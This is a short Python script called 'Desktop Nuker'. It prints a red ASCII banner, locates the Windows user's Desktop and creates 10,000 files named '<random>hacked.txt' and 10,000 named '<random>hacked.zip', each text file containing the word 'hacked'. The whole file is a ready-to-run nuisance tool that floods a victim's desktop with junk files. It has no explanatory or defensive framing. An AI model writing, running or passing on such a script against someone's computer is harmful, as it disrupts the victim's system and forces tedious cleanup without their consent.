import os
from colorama import Fore, Style
import random

os.system("title Desktop Nuker")
cls = lambda: os.system('cls')
cls() 

banner = f"""{Fore.RED}

                    ███╗   ██╗██╗   ██╗██╗  ██╗███████╗██████╗ 
                    ████╗  ██║██║   ██║██║ ██╔╝██╔════╝██╔══██╗
                    ██╔██╗ ██║██║   ██║█████╔╝ █████╗  ██████╔╝
                    ██║╚██╗██║██║   ██║██╔═██╗ ██╔══╝  ██╔══██╗
                    ██║ ╚████║╚██████╔╝██║  ██╗███████╗██║  ██║
                    ╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                           {Style.RESET_ALL} 
"""

print(banner)

max = 10000

desktop = os.environ['USERPROFILE'] + '\Desktop' # Findet Desktop
def mass():
    for i in range (0, max):
        num = random.random()
        fp = open(f'{desktop}/{num}hacked.txt', 'x')
        f = open(f'{desktop}/{num}hacked.zip', 'x')
        fp.write("hacked")
        fp.close()
        f.close()

mass()